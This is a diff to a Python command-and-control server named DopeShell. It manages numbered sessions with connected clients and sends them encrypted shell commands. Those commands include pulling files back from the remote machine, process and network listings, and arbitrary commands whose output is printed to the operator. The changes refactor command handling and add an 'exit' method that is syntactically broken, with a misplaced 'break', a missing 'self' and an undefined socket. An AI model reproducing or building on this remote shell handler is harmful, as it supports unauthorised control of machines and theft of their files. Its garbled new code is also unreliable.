@@ -1,5 +1,6 @@
 # dopeshell/server.py
-
+# TODO:
+# differentiate between folders and files in LS command
 import socket
 import threading
 import base64
@@ -67,6 +68,10 @@ class DopeShellServer:
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
         return decrypted_data
+    def exit(command):
+        client_socket.send(self.encrypt(command.encode('utf-8')))
+            break
+
 
     def handle_client(self, session_id, client_socket):
         while True:
@@ -75,8 +80,7 @@ class DopeShellServer:
             command = input(f"Session {session_id} Shell> ")
             
             if command.lower() == 'exit':
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                break
+                exit(command)
 
             if command.lower().startswith('help'):
                 parts = command.split(maxsplit=1)
@@ -96,27 +100,13 @@ class DopeShellServer:
                 client_socket.send(self.encrypt(help_text.encode('utf-8')))
                 continue
 
-            elif command.lower().startswith('ls'):
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = client_socket.recv(4096)
-                print(self.decrypt(response).decode('utf-8'))
-
-            elif command.lower().startswith('pwd'):
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = client_socket.recv(4096)
-                print(self.decrypt(response).decode('utf-8'))
-
-            elif command.lower().startswith('cd'):
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = client_socket.recv(4096)
-                print(self.decrypt(response).decode('utf-8'))
-
             elif command.lower().startswith('download'):
                 _, remote_path = command.split()
                 client_socket.send(self.encrypt(command.encode('utf-8')))
                 with open(os.path.basename(remote_path), 'wb') as f:
                     while True:
-                        file_data = self.decrypt(client_socket.recv(4096))
+                        # file_data = self.decrypt(client_socket.recv(4096))
+                        file_data = self.receive_data(client_socket)
                         if file_data == b'EOF':
                             break
                         f.write(file_data)
@@ -132,31 +122,7 @@ class DopeShellServer:
                 response = client_socket.recv(4096)
                 print(self.decrypt(response).decode('utf-8'))
 
-            elif command.lower() == 'info':
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = client_socket.recv(4096)
-                print(self.decrypt(response).decode('utf-8'))
 
-            elif command.lower() in ['mkdir', 'delete', 'kill', 'clear', 'find', 'sysinfo']:
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = client_socket.recv(4096)
-                print(self.decrypt(response).decode('utf-8'))
-
-            elif command.lower().startswith('cat'):
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = self.receive_data(client_socket)
-                print(response.decode('utf-8'))
-
-            elif command.lower() in ['ifconfig', 'ipconfig', 'find']:
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = self.receive_data(client_socket)
-                print(response.decode('utf-8'))
-
-            elif command.lower() in ['ps', 'netstat']:
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = self.receive_data(client_socket)
-                print(response.decode('utf-8'))
-            
             elif command.lower() == 'sessions':
                 self.list_sessions()
 
@@ -170,8 +136,10 @@ class DopeShellServer:
                 continue
             else:
                 client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = client_socket.recv(4096)
-                print(self.decrypt(response).decode('utf-8'))
+                # response = client_socket.recv(4096)
+                # print(self.decrypt(response).decode('utf-8'))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
 
         client_socket.close()
         del self.sessions[session_id]  # Remove session on exit
@@ -181,7 +149,7 @@ class DopeShellServer:
 
     def run(self):
         print(f"[*] Listening on {self.host}:{self.port}")
-        while True: 
+        while True:
             client_socket, addr = self.sock.accept()
             session_id = self.session_counter
             print(f"[*] Connection from {addr}, Session ID: {session_id}")
